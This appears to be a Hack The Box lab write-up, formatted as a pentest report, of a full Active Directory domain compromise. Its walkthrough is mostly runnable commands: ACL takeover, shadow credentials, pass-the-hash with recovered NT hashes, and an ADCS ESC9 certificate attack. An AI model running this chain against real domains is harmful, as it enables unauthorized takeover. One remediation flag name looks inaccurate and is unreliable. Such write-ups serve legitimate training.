# Penetration Test Report — Certified

![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-ADCS%20%2F%20ACL%20abuse-red)

## Executive Summary

An authorized assessment was performed against `target.htb`, a Domain Controller for the `certified.htb` domain, under an **assumed-breach** scenario with credentials for a low-privileged user (`judith.mader`). Chained Active Directory ACL abuse (WriteOwner → GenericWrite → shadow credentials) produced a foothold as `management_svc`. Further enumeration of Active Directory Certificate Services (ADCS) exposed a template vulnerable to **ESC9**, enabling impersonation of the domain Administrator and full domain compromise.

## Scope

| Item | Detail |
|---|---|
| Target | `target.htb` (DC01.certified.htb) |
| Environment | Active Directory Domain Controller |
| Starting access | Domain user credentials (assumed breach) |

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Excessive ACL rights: `judith.mader` has WriteOwner over `management` group | High |
| 2 | `management` group holds GenericWrite over `management_svc` | High |
| 3 | `management_svc` holds GenericAll over `ca_operator` | High |
| 4 | ADCS template `CertifiedAuthentication` vulnerable to ESC9 (no security extension) | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap --open target.htb | grep open | cut -d' ' -f1 | cut -d'/' -f1 | paste -sd,)
nmap target.htb -p $ports -sV -sC -Pn --disable-arp-ping
```

DNS (53), Kerberos (88), SMB (445), LDAP/LDAPS (389/636) and WinRM confirmed a Domain Controller. Domain: `certified.htb`; DC: `DC01.certified.htb` — added to `/etc/hosts`.

Domain data was collected with BloodHound:

```bash
bloodhound-python -d certified.htb -u 'judith.mader' -p 'judith09' \
  -dc 'dc01.certified.htb' -c all -ns target.htb
sudo neo4j console
```

BloodHound's *Reachable High Value Targets* for `judith.mader` revealed the attack path:

1. `judith.mader` — **WriteOwner** → `management` group
2. `management` — **GenericWrite** → `management_svc`
3. `management_svc` — **CanPSRemote** (WinRM logon rights)

### 2. Foothold — ACL Abuse Chain

Take ownership of the `management` group:

```bash
bloodyAD --host "target.htb" -d "certified.htb" -u "judith.mader" -p 'judith09' \
  set owner management judith.mader
```

Grant full control over the group DACL:

```bash
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance \
  -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
```

Add ourselves to the group:

```bash
net rpc group addmem "management" "judith.mader" \
  -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb"
```

Abuse GenericWrite on `management_svc` via **shadow credentials** (pywhisker):

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p 'judith09' \
  --target "management_svc" --action "add"
```

Request a TGT with the generated PFX and recover the NT hash:

```bash
python3 gettgtpkinit.py -cert-pfx <cert>.pfx certified.htb/management_svc \
  -pfx-pass '<pfx-password>' management_svc.ccache

export KRB5CCNAME=management_svc.ccache
python3 getnthash.py -key <as-rep-key> certified.htb/management_svc
```

Pass-the-Hash over WinRM; user flag at `C:\Users\management_svc\Desktop\user.txt`:

```bash
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

### 3. Lateral Movement — `ca_operator`

BloodHound showed `management_svc` has **GenericAll** over `ca_operator`. The same shadow-credentials technique was repeated:

```bash
python3 pywhisker.py -d "certified.htb" -u "management_svc" \
  -H 'a091c1832bcdd4677c28b5a6a1295584' --target "ca_operator" --action "add"
python3 gettgtpkinit.py -cert-pfx <cert>.pfx certified.htb/ca_operator -pfx-pass '<pass>' ca_operator.ccache
export KRB5CCNAME=ca_operator.ccache
python3 getnthash.py -key <key> certified.htb/ca_operator
```

Recovered NT hash for `ca_operator`: `b4b86f45c6018f1b664f70805f45d8f2`.

### 4. Privilege Escalation — ADCS ESC9

ADCS enumeration:

```bash
nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M adcs

certipy find -u ca_operator@certified.htb \
  -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
```

The template `CertifiedAuthentication` (CA: `certified-DC01-CA`) was flagged **ESC9**: enrollment rights for `operator ca` and no security extension — the certificate can be bound to an arbitrary UPN.

Change `ca_operator`'s UPN to `Administrator`:

```bash
certipy-ad account update -username management_svc@certified.htb \
  -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

Request the certificate, then restore the original UPN:

```bash
certipy-ad req -username ca_operator@certified.htb \
  -hashes b4b86f45c6018f1b664f70805f45d8f2 \
  -ca certified-DC01-CA -template CertifiedAuthentication

certipy-ad account update -username management_svc@certified.htb \
  -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

Authenticate with the certificate and recover the Administrator NT hash:

```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb
# Administrator NT: 0d5b49608bbce1751f708748f67e2d34
```

Domain Administrator shell:

```bash
evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

Root flag: `C:\Users\Administrator\Desktop\root.txt`.

## Remediation

- Audit and remediate excessive ACEs (WriteOwner/GenericWrite/GenericAll) with BloodHound on a recurring basis.
- Enable the **CT_FLAG_ENFORCER_CHECKSSUBJECTALTNAME / security extension** on certificate templates; restrict enrollment rights.
- Monitor for shadow-credential writes (`msDS-KeyCredentialLink` changes) and UPN modifications.
- Tier service accounts; `management_svc`-type accounts should never hold control over CA operators.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Privilege Escalation | T1078 — Valid Accounts |
| Credential Access | T1558 — Steal or Forge Kerberos Tickets |
| Privilege Escalation / Persistence | T1649 — Steal or Forge Authentication Certificates (ESC9) |
| Credential Access | T1003.006 — DCSync-adjacent ACL abuse |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
